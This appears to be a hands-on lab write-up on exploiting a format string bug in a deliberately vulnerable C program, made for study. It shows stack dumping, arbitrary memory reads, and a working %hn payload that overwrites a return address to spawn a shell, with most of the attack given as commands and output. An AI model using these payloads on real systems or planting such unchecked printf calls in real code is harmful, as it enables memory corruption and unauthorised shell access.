### Info
In this lab, we'll try to exploit format string bugs<br/><br/>
**Environment**: Ubuntu 18.04.3 LTS, ASLR disabled<br>
**Keywords**: format string vulnerability

### Implementation
Format string vulnerabilities occur when a user controlled string is passed to the printf like functions (sprintf, snprintf ...)
as the format parameter.
Here is the minimal example code. User input received with `scanf` is directly passed to printf as `printf(buf)`
```
uzi@pwnpatrol:$ cat fs.c 
#include <stdio.h>
int authenticate()
{
    char buf[32]={0};
    int pass = 0xaabbccdd;
    
    printf("username:");
    scanf("%31s",buf);
    printf(buf);
    printf(", welcome. password:");
    
    scanf("%x",&pass);
    if(pass == 0xdeadcafe)
    {
        system("/bin/sh");
    }
}
int main(int argc, char **argv)
{
    authenticate();
}
```
Actually when you compile this program, you'll get the warning below regarding vulnerability:
```
fs.c: In function ‘authenticate’:
fs.c:11:12: warning: format not a string literal and no format arguments [-Wformat-security]
     printf(buf);
```
#### Increment 1: Exposing data from stack
A valid printf of usage with format specifier is as the following:
```
printf("Integer value is %d\n" , my_int_var);
```
If you omit the second parameter `my_int_var`, printf dumps the content in the next word after address of format string in stack. On the other hand, if you specify more specifiers than the number or arguments, again printf dumps further data from stack.

Back to our example source code, just before `call printf(buf)`, stack of `authenticate` will look like below. Address of buffer is pushed to the stack. 
Notice the junk data. The reason for them is for stack alignment required by OS, and hence generated by compiler. The aligment size, alignment layout depends on compiler parameters and versions. We just need to understand that by looking at source code, you can never assume a stack layout, because it's completely based on compiler. Therefore in the below layout, I've added junk data to the every item we're interested. Some of them may or may not exist at all if you rebuild the source file.

``` 
+------------------------+
| addr. of buf (fmt str) |
+------------------------+
|  ...  junk data   ...  | 
+------------------------+
| local var: pass        | 
+------------------------+
|  ...  junk data   ...  | 
+------------------------+
| local var: buf[32]     |
+------------------------+
|  ...  junk data   ...  | 
+------------------------+
| prev ebp               |
+------------------------+
| ret addr to main       |
+------------------------+
higher address
```
So with this layout, the more specifier we feed to the stdin of process and in turn to the printf , the more data we'll expose data from the stack.<br/>
We expose the data as the following. `;echo` is just added to have a new line after each output. By the way `;` is a seperator to run multiple commands in one line. `<<<` is here operator that feeds a string into the standard input.
```
uzi@pwnpatrol:$ ./fs <<< '%x';echo
username:ffffd530, welcome!
password:
uzi@pwnpatrol:$ ./fs <<< '%x,%x,%x';echo
username:ffffd530,0,5f389700, welcome!
password:
uzi@pwnpatrol:$ ./fs <<< '%x,%x,%x,%x,%x,%x';echo
username:ffffd530,0,ebb27f00,9,ffffd742,f7e184a9, welcome!
password:
uzi@pwnpatrol:$ ./fs <<< '%x,%x,%x,%x,%x,%x,%x,%x,%x';echo
username:ffffd530,0,ea32f300,9,ffffd742,f7e184a9,aabbccdd,252c7825,78252c78, welcome!
password:
``` 
As you see, we dumped several words in stack (some junk, some meaningful). Our local variable `pass` with the initial value `0xaabbccdd` is somewhere around the middle of function stack.
Format strings have an important feature:
* We can specify the nth argument in format string directly. For example `0xaabbccdd` was the 7th word dumbed above. We can dump just it using `%<number>$specifier` syntax:
```
uzi@pwnpatrol:$ ./fs <<< '%7$x'
username:aabbccdd, welcome!
password
```
PS: Notice that I used single qoutes around the argument. If you use double quotes, shell will try to expand $x.

#### Increment 2: Reading a valid address
When we go deeper during dumping, we'll encounter the local buffer storing the format string. For this reason I created a simple signature ABCD and used it in format string. Let's try to dump further expecting to see 0x44434241.
```
uzi@pwnpatrol:$ ./fs <<< 'ABCD%8$x'
username:ABCD44434241, welcome!
password:
```
In the 8th word, I hit the buffer.<br/>
Now you can image that if we write a valid memory address instead of ABCD and use %s format specifier, we can see the content starting with that address till the null byte.
As a target address, we'll read opcodes of main function, let's check them first.
```
uzi@pwnpatrol:$ objdump -Mintel -d fs | grep -A 5 "<main>"
08048556 <main>:
 8048556:       8d 4c 24 04             lea    ecx,[esp+0x4]
 804855a:       83 e4 f0                and    esp,0xfffffff0
```
Now we'll put the address 0x08048556 to the beginning of format string. The easiest way is to use shell feature for escaping bytes using ANSI-C syntax. Below you can observe the opcodes `8d 4c` starting after the bytes of "username:" and 4 bytes of address itself.
```
uzi@pwnpatrol:$ ./fs <<< $'\x56\x85\x04\x08%8$s'
username:V�L$����q�U��Q���J����, welcome!
password:uzi@pwnpatrol:$ ./fs <<< $'\x56\x85\x04\x08%8$s' | xxd -g 1
00000000: 75 73 65 72 6e 61 6d 65 3a 56 85 04 08 8d 4c 24  username:V....L$
00000010: 04 83 e4 f0 ff 71 fc 55 89 e5 51 83 ec 04 e8 4a  .....q.U..Q....J
00000020: ff ff ff b8 2c 20 77 65 6c 63 6f 6d 65 21 0a 70  ...., welcome!.p
00000030: 61 73 73 77 6f 72 64 3a
```
#### Increment 3: Writing to a valid address - I
The last thing to do is to write to a valid and writable memory region of the process.
* One interesting feature of format string is that using `n` specifier, the number of characters written so far is stored in the location pointed by argument.
```
password:uzi@pwnpatrol:$ ./fs <<< '%7$n'
Segmentation fault (core dumped)
```
To understand what happened, we can start the binary with gdb and run with 'foobar%7$n'. I added 'foobar' to the beginning to otherwise the length to be written will be zero. 
```
uzi@pwnpatrol:$ gdb -q fs
Reading symbols from fs...(no debugging symbols found)...done.
(gdb)  r <<< 'foobar%7$n'
Starting program: /home/uzi/exploit_labs/lab7_format_string/fs <<< 'foobar%7$n'
Program received signal SIGSEGV, Segmentation fault.
0xf7e30745 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb
```
Let's check segfaulting instruction and its operands. As explained above, it tried to write the length(6) of "foobar" (via $esi) to the location pointed by 7th argument ($eax). In this case, it's not a valid address of the process, and therefore program segfaulted.
```
(gdb) x/i $eip
=> 0xf7e30745:  mov    DWORD PTR [eax],esi
(gdb) i r eax esi
eax            0xaabbccdd       -1430532899
esi            0x6      6
```

Now we can try to override the return address to main. With ASLR disabled, we can easilfy find it with gdb, but the more different tools, techniques we use, the more we'll be experienced. But then, how will we find the address to override?<br/>
As we did above, we'll dump some values from stack and try to guess an attack range. With the following script, we'll do 20 trials. Observe how I escaped the second $ below. The first $ will be replaced with the value of i, and the second one is not a shell variable but part of our string to be passed to stdin.
```
uzi@pwnpatrol:$ for i in {1..20}; do ./fs <<< %$i\$x; echo ; done | grep username
username:ffffd530, welcome!
username:0, welcome!
username:eba55400, welcome!
username:9, welcome!
username:ffffd742, welcome!
username:f7e184a9, welcome!
username:aabbccdd, welcome!
username:78243825, welcome!
username:0, welcome!
username:0, welcome!
username:0, welcome!
username:0, welcome!
username:0, welcome!
username:0, welcome!
username:0, welcome!
username:1, welcome!
username:ffffd614, welcome!
username:ffffd568, welcome!
username:804856c, welcome!
username:f7fe59b0, welcome!
```
The values 0xffffd530,0xffffd614,0xffffd568, looks like they are addresses from stack, why? They start with 0xffff, they are close to each other.<br/>
We'll run the application many times, and each trial, we'll try to write a dummy value to location 0xffffd520 - 0xffffd620. I selected these values based on samples I've found and added some margin to them. If we hit the return address in one of these attempts, application should get a segmentation fault due to bad $eip address.<br/>
For this purpose, I've created a simple script that generates just the commands because it was really complex to embed it into a shell script. 
```
uzi@pwnpatrol:$ cat cmds.py 
for i in range(0xd520,0xd620,4):
    bytes = i.to_bytes(2,'little')
    print(rf"./fs <<< $'\x{bytes[0]:02x}\x{bytes[1]:02x}\xff\xff%8$n'")
```
When the commands generated, I need to run them:
* The simplest and convenient way is to use shell builtin `source` command. It basically executes commands from a file in the current shell. It doesn't cause a change in environment variables since it doesn't run the commands within a new shell. The dot operator `.` is same as `source`.
* With the `<(python3 cmds.py)` feature, shell creates a temporary file on the fly and pass its name. So I don't need to create a file manually. Run it, and you'll see output like below.
```
uzi@pwnpatrol:$ . <(python3 cmds.py)
...
Segmentation fault (core dumped)
username:$���, welcome!
password:username:(���, welcome!
password:username:\���, welcome!
Segmentation fault (core dumped)
...
```
Some executions caused segmentation faults, let's check what happened via `dmesg`. Specifically I'm interested in the segfaults where $eip has the value 4 (the value we override as return address to main). There are two items, we look for the first one. (most probably the second one is the return address to libc_main_start).
```
[26715.982970] fs[10631]: segfault at 4 ip 0000000000000004 sp 00000000ffffd560 error 14 in fs[8048000+1000]
```
It seems that we succesfully overriden the return address, because $eip is 4. The value of $esp at that moment was 0xffffd560. So we can say that the return address was $esp - 4, that is 0xffffd55c. However 4 is not a desired address, we must be able to inject a useful address.

#### Increment 4: Writing (something useful) to a valid address - II
We know that we can change the return adress to main. Now, we'll try to replace return address with a useful address. The ideal address is the call of `system("/bin/sh")`. So without entering the password we can jump to the shell. 
We find the address as the following. It's `0x8048546`.
```
uzi@pwnpatrol:$ objdump -Mintel -d fs | grep  -B 3 "call.*system"
 8048541:       75 10                   jne    8048553 <authenticate+0x9d>
 8048543:       83 ec 0c                sub    esp,0xc
 8048546:       68 27 86 04 08          push   0x8048627
 804854b:       e8 10 fe ff ff          call   8048360 <system@plt>
```
But how can we write 0x8048546 characters before specifier `n`?. We need to utilize another format string feature, called padding. For example, $eip will be 104 (0x68) if we use %100x after the address since %100x prints the argument padded to at least 100 characters. 
Below we verify it. 
```
uzi@pwnpatrol:$ ./fs <<< $'\x5c\xd5\xff\xff%100x%8$n'
[ 3588.165158] fs[5550]: segfault at 68 ip 0000000000000068 sp 00000000ffffd560 error 14 in fs[8048000+1000]
```
Can we use 134513990 (decimal of 0x8048546) instead of 100? Yes and no. If we try to printf all 134513990 characters at once, things might go wrong. Therefore, we'll use the
half write 'hn' feature of printf instead of 'n'. That's we'll be writing target address in 2 steps (still one string to pass to stdin but two dedicated write operations in the string)

* 0xffffd55e: This is the higher part of destination address that we'll put higher bytes of target address. That's 0x0804 (decimal: 2052)
* 0xffffd55c: This is the lower part of destination address that we'll put lower bytes of target address. That's 0x8546 (decimal: 34.118) 
* These 8 bytes will be first part of string. Now comes the padding, and writing parts.
* %2044x%8$hn: As listed above, we've written already 8 bytes, therefore we need to pad 2044 bytes to reach the desired length value 2052 and write it to the address pointed by 8th argument.
* %32066x%9$hn: 2052 bytes written so far and therefore we need 34118-2052=32066 additional paddings. We write it to the address pointed by 9th argument.

The resulting string is as the following. When the run it, you'll see a very large blank output due to those paddings and application will return.
```
./fs <<<  $'\x5e\xd5\xff\xff\x5c\xd5\xff\xff%2044x%8$hn%32066x%9$hn'
... 
... lots of blank
... 
0, welcome!
password:uzi@pwnpatrol:$
```
There's no shell and no segmentation fault as well. This may mean that our exploit worked but the shell closed as we see in the early exploit labs.So in this case, we need to prevent EOF occuring in standard input. So simply we change the way we feed our string to executable so that we can append a `cat` after it.
```
(echo $'\x5e\xd5\xff\xff\x5c\xd5\xff\xff%2044x%8$hn%32066x%9$hn';cat) | ./fs
```
When I run it, executable expected some input (I need to check it later), I've provided 'dummy' as input, then I've issued 'ls' and got the files.
```
0, welcome!
dummy
ls
README.md  build.sh  cmds.py  core  fs  fs.c  payload
password:uzi@pwnpatrol:$
```

The stack locations are very fragile due to environment variables. For example the current working directory and even the previous working directory is an environment variables.
So this means that if you switch to the lab7_format_string from different previous folders, you'll get different stack layouts.

A nice way to overcome this issue (at least to isolate issues related to different stack layout) is mentioned here. https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html. Basically by using `env -i` as a prefix to the executable, we can have a environment variable free **environment**.

